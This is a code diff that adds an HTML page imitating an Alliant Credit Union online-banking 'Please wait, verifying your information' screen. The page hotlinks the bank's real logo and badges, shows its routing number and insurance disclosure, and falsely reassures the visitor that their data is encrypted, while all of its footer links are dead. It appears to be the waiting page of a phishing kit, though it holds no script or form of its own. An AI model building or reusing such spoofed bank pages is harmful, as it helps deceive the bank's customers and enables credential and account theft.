@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Alliant – Please wait</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #ffffff;
+      color: #333;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* ---------- TOP SPLIT ---------- */
+    .top {
+      height: 100vh;
+      display: flex;
+    }
+
+    /* LEFT PANEL – waiting state */
+    .left {
+      flex: 1;
+      width: 30%;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 0 40px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #333;
+      text-align: center;
+    }
+
+    .left > * {
+      max-width: 340px;
+      width: 100%;
+    }
+
+    .logo {
+      width: 230px;
+      margin-bottom: 60px;
+    }
+
+    /* spinner */
+    .spinner-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 28px;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border: 5px solid #e8eef2;
+      border-top-color: #7ba428;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .wait-title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 8px;
+    }
+
+    .wait-message {
+      font-size: 15px;
+      color: #627277;
+      line-height: 1.5;
+      max-width: 320px;
+    }
+
+    .wait-message strong {
+      color: #333;
+      font-weight: 600;
+    }
+
+    /* subtle pulsing dots under the message */
+    .pulse-dots {
+      display: flex;
+      gap: 6px;
+      margin-top: 20px;
+    }
+
+    .pulse-dots span {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #7ba428;
+      opacity: 0.3;
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+
+    .pulse-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .pulse-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes pulse {
+      0%, 80%, 100% { opacity: 0.3; transform: scale(1); }
+      40% { opacity: 1; transform: scale(1.15); }
+    }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #888;
+      margin-top: 36px;
+    }
+
+    .security-note svg {
+      flex-shrink: 0;
+    }
+
+    /* RIGHT PANEL – blue presentation */
+    .right {
+      flex: 2;
+      width: 70%;
+      background: #00A3E0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .right img {
+      width: 70%;
+      max-width: 700px;
+      filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.08));
+    }
+
+    /* ---------- FOOTER ---------- */
+    .bottom {
+      background: #ffffff;
+      border-top: 1px solid #ddd;
+      display: flex;
+      align-items: flex-start;
+      gap: 40px;
+      padding: 18px 50px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #555;
+    }
+
+    .badges {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-shrink: 0;
+    }
+
+    .badge-housing {
+      width: 100px;
+      height: 100%;
+    }
+
+    .badge-ncua {
+      width: 180px;
+    }
+
+    .footer-content {
+      font-size: 15px;
+    }
+
+    .footer-links {
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin: 0 14px;
+    }
+
+    .footer-links a:first-child {
+      margin-left: 0;
+    }
+
+    .footer-links .sep {
+      color: #ccc;
+    }
+
+    .footer-row {
+      margin-bottom: 10px;
+    }
+
+    .footer-row a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin-right: 14px;
+    }
+
+    .footer-disclosure {
+      line-height: 1;
+      font-family: sans-serif;
+      color: #627277;
+    }
+
+    /* ---------- MOBILE ---------- */
+    @media (max-width: 768px) {
+      .top {
+        height: auto;
+        flex-direction: column;
+      }
+
+      .right {
+        display: none;
+      }
+
+      .left {
+        width: 100%;
+        justify-content: flex-start;
+        align-items: center;
+        text-align: center;
+        padding: 50px 25px 30px;
+      }
+
+      .left > * {
+        max-width: 480px;
+      }
+
+      .logo {
+        width: 250px;
+        margin: 20px auto 50px;
+        margin-bottom: 100px;
+      }
+
+      .spinner {
+        width: 56px;
+        height: 56px;
+        border-width: 4px;
+      }
+
+      .wait-title {
+        font-size: 22px;
+      }
+
+      .wait-message {
+        font-size: 14px;
+      }
+
+      .bottom {
+        justify-content: center;
+        text-align: center;
+        padding: 25px;
+        border-top: none;
+      }
+
+      .badges {
+        display: none;
+      }
+
+      .footer-links a,
+      .footer-row a {
+        margin: 0 8px;
+        font-size: 12px;
+      }
+      .footer-row span {
+        font-size: 12px;
+      }
+
+      .footer-disclosure {
+        line-height: 1.4;
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top">
+      <!-- LEFT: waiting state -->
+      <div class="left">
+        <img class="logo" src="https://www.alliantcreditunion.com/OnlineBanking/Content/alliant-logo.svg" alt="Alliant">
+
+        <div class="spinner-wrap">
+          <div class="spinner" role="status" aria-label="Loading"></div>
+
+          <div>
+            <div class="wait-title">Please wait</div>
+            <p class="wait-message">
+              We're <strong>verifying your information</strong>. This will only take a moment.
+              Please do not close or refresh this page.
+            </p>
+            <div class="pulse-dots" aria-hidden="true">
+              <span></span><span></span><span></span>
+            </div>
+          </div>
+        </div>
+
+        <div class="security-note">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#888" stroke-width="2" aria-hidden="true">
+            <rect x="4" y="11" width="16" height="10" rx="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          </svg>
+          <span>Your information is encrypted and secure.</span>
+        </div>
+      </div>
+
+      <!-- RIGHT: blue panel -->
+      <div class="right">
+        <img src="https://www.alliantcreditunion.com/OnlineBanking/Content/login-presentation.png" alt="">
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="bottom">
+      <div class="badges">
+        <img class="badge-housing" src="https://www.alliantcreditunion.com/OnlineBanking/design/equal-housing-opportunity.png" alt="Equal Housing Opportunity">
+        <img class="badge-ncua" src="https://www.alliantcreditunion.com/OnlineBanking/design/ncua.png" alt="NCUA">
+      </div>
+
+      <div class="footer-content">
+        <div class="footer-links">
+          <a href="#">Disclosures</a><span class="sep">|</span>
+          <a href="#">Terms</a><span class="sep">|</span>
+          <a href="#">Privacy</a><span class="sep">|</span>
+          <a href="#">Accessibility</a>
+        </div>
+        <div class="footer-row">
+          <a href="#">Help Center</a><span class="sep">|</span>
+          <span style="margin-left:14px;">ABA Routing and Transit Number #271081528</span>
+        </div>
+        <div class="footer-disclosure">
+          Alliant Credit Union, Chicago, IL. Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States
+          Government - National Credit Union Administration (NCUA), a U.S. Government Agency. Ver: 1.0.0.0
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
